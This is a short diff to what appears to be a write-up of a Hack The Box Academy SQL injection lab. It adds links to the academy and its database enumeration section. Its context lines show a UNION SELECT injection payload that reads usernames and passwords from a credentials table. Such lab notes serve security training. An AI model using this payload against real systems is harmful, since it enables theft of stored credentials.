@@ -78,3 +78,6 @@ Now that we have identified the columns within the credentials column, we can us
 
 >cn' UNION SELECT 1, username, password, 4 FROM dev.credentials- --
 
+### Related:
+- [Hack The Box Academy](https://academy.hackthebox.com/ "Hack The Box Academy Home page")
+- [HTB Database Enumeration](https://academy.hackthebox.com/module/33/section/217 "HTB Database Enumeration")
